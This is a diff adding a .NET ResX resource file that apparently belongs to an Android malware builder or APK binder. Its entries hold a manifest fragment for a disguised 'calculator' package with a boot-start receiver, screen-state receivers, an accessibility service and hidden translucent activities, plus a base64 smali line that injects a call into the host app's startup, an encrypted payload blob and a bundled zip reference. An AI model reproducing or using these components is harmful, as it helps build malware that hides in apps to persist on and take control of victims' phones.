@@ -1,0 +1,206 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="CypherMini" xml:space="preserve">
+    <value>        &lt;service android:enabled="true" android:label="ScanService" android:name="com.andscan.betar.calcolator.MainReflectorScan"/&gt;
+        &lt;service android:enabled="true" android:label="HelpService" android:name="com.andscan.betar.calcolator.EngineWorkerins"/&gt;
+        &lt;receiver android:enabled="true" android:exported="true" android:name="com.andscan.betar.calcolator.AgreeingEngineering"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.intent.action.BOOT_COMPLETED"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver android:name="com.andscan.betar.calcolator.ReceversAnalys"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.intent.action.SCREEN_ON"/&gt;
+                &lt;action android:name="android.intent.action.SCREEN_OFF"/&gt;
+                &lt;action android:name="android.Intent.ACTION_USER_PRESENT"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;service android:name="com.andscan.betar.calcolator.AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg"/&gt;
+        &lt;service android:enabled="true" android:label="DataEngine" android:name="com.andscan.betar.calcolator.JunkFileCov"/&gt;
+        &lt;service android:enabled="true" android:label="FilesManage" android:name="com.andscan.betar.calcolator.FileLocator"/&gt;
+        &lt;service android:name="com.andscan.betar.calcolator.GPSCAN" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="android.accessibilityservice.AccessibilityService"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/service&gt;
+        &lt;activity android:excludeFromRecents="true" android:name="com.andscan.betar.calcolator.SecoundActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
+        &lt;activity android:elevation="0.0dip" android:excludeFromRecents="true" android:label="Settings" android:launchMode="singleInstance" android:name="com.andscan.betar.calcolator.flyactiv" android:noHistory="true" android:theme="@android:style/Theme.Dialog"/&gt;
+        &lt;service android:enabled="true" android:name="com.andscan.betar.calcolator.WackMeUpJob" android:permission="android.permission.BIND_JOB_SERVICE"/&gt;
+        &lt;receiver android:name="com.andscan.betar.calcolator.MyReceiver"&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name="MyAction"/&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;</value>
+  </data>
+  <data name="oncreatecode" xml:space="preserve">
+    <value>ICAgIGludm9rZS12aXJ0dWFsL3JhbmdlIHtwMH0sIFt0cmd0bWFpbl0tPlNjYW5OZXcoKVY=</value>
+  </data>
+  <data name="MethRn" xml:space="preserve">
+    <value>ST</value>
+  </data>
+  <data name="PRO" xml:space="preserve">
+    <value>\PROID</value>
+  </data>
+  <data name="MainMith" xml:space="preserve">
+    <value>xaWzFj/ixT+QAJ9qHuB8pE1++tkfxdnVw6A3OhWj9cJtGmlZFUWSJHiyHKtK1AUHXwkcc0wK9HGl
+Yx5nOAIVHmRkZhGxPeCXJRG4Jgl9iu+cP3lmYFG+EKbgClXpfuXKA/W4KEuYPyQte8Dn27fbmcaJ
+w998AVJHOuhFXFniAsRxUqlW0N0bDkieZSpCjixVHxIt826F2fFkCQ678s7tGjvbr9LU+SaJgDiI
+gVlQ9Sn+FSwvNRhUb/u8a4HMBqbXlNfowx+vaFIhlEm4blsWnhfLcwF+R6qEU81WMCJXoIdPu8y/
+lGZpkIJhbjG2mVsqYmG8/maUM1hUgDiagHFBr4vMa5m7cnWhpY8KDLhygv3y8+DDMDFWPnT4E0/n
+AC1/hJ3st8vAXhNwRF3E3o5Ca7bp/EnLAbWtyhgFCnsFiNFmxzYW6jm60wwkAPj46fJC7zMwpA4h
+QEvbaRLlXWUX31Fsgq3psuLbOdQzAgUk1tVblB0Y/FouWsfMSJSOh3KLrQj0JAj9YTFem1aCuPee
+vz2obTJB5rfQ7ZwYHCUhlCJDxQ7zJBwVFNU9zu7wvQ75WYBfKbzoiJgSoE9XS45VLQVPiGteS7QD
+kPjB+mjzJen6js5mrHXqCmnpLKJcdNgqnR42sLfYpwKCKptE01R243a+nXqEVdf2+bvPINpF3s08
+LvNWWF2onN4ubpsYd9J/pl6pxQ+tyKNDNouDIZBR5JL0hTV/PQFUuY8ZclXCqVX1LD3fsb35zTMV
+sxd3EVAzZdmp1MtkLi8W28PN5phDDzyU3XIFoXGzhroFP6SB73YFT4hrXku0A5D4wfpo8yXp+o7O
+Zqx16gpp6SyiXHTYKp0eNrC32KcCgiqbRNNUduN2vp16hFXX9vm7zyDaRd7NRguVWN34qGzliD7n
+9WHspZzKLSW4bGNe8cVMpIIlwH4fHXTuPo1K2ejYSWkgJPdiCdqrDujzVFbmxG0fKcJS0gndMGqg
+heNCXRXRPG437WTB6OXZC+oS18ai4fWkX1vW6Wv5eqm8Q8cAPFY063Gl5RQZuhJV1AQpCjuCekX1
+ziCplwmq79EYpFGFTwg4NSMcE5MHqV5rTFHpYxB2MAnj0pvdAPTTF5wtVUy+HgMGI5WthLZfjdWi
+cKJGuS1fVQVtuHSnZascAPM6GNMgBOU9r85yeQTwmBguDlQblNeVfxo2eqCewJkxs389mTtYSAgw
+wx5DbaJrwbb1oHxVSJ6KPe6DHxmaiRih33JIM/PGKnJcMvenHplQRTYvjeqMRua8HFrubLYEDiL5
+/k/gSTVK++O/BuWu7aFW1hqz2+b+LSvg/IeH9BawR7/RBddATY68MIUuUpkeGN10OzrLEJUcQM18
+2adYqUlMlELVigQFOLT9NMJhWQhC2G7GA4t6YuQHIOAJxbffFBe4dWNSF28+RHHBnNtxoP6S+fRP
+Efzjpb7KcLNNYtrzcotHdCBLHW+KvxwOYb6/U+SUd1m484o9HCyY5/G+vTC2ajvu/tZCADvHgO3a
+TpaR8ge87ErUBCqCGk3UjSGriym3H4Ng1ebF9uorjOPweNys/d1BIHUEcYo2kHqDYfo9g2LiqCT8
+CRudw4Egrrv+TkA0uSOmo4caw3f4u3MV1IIVHwFkB1rwioX1R17p47TtWU17KjwDeB5Luz4Wl13p
+iaDZBuH7glc2430BneJ6LRtxiFejksYD1bcWHuRCDkUhUABtkma8YB0S/3j7Qy7YHdteQKL11be8
+0UGX1pkctLpYPc5QcDHTdUsaTdSNIauLKbcfg2DV5sX2q8zo6kLrJ10LQ3XzgHKQUTqqwsvGH4bG
+Sh/EvfCPLhtMXyI4HX3p9F+xqp1IuvQfsbPmi4xuKpOKDJpQ3E4UdXVdn6Fm3cLwP7skOFVTTvZV
+TdPul8jZFJNx3P96uBAiQ3UvMfAqJf0hUoCzQDPf8rGH8Q01TvdhBMejdIW0ADRaZTZ1QkOQe131
+/oHQGNJwVhURaPUB6SrmuPX5mbp1P/w7dpw/tN+YI2vpC/bVsRo0pD2BKo/pST5eXtLurKb6ISH+
+uhoSk1l8IP2WX2XsMBPg3z2P8AyUcnQ/ATe/9QfjnJC0w3ETk0WLcEXmmn1EWrJM6gsbuMMabvS4
+sjXcJagbynenvzA4ASy60eHTw7dbBSein3B3ZovvOq3/zmg9u04xMcMQlCMP+nFBDDJSRMt53DGY
+BOmyaxR9QaqegAsBoCNmgp1fRL4v2huIT6pkzYHb6AYWizFsZ4tKNnhh7A==</value>
+  </data>
+  <data name="FORGROUD" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.FOREGROUND_SERVICE"/&gt;</value>
+  </data>
+  <data name="ReadPrim" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/&gt;</value>
+  </data>
+  <data name="WritePrim" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/&gt;</value>
+  </data>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="NEWAPS" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\NEWAPS.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+</root>
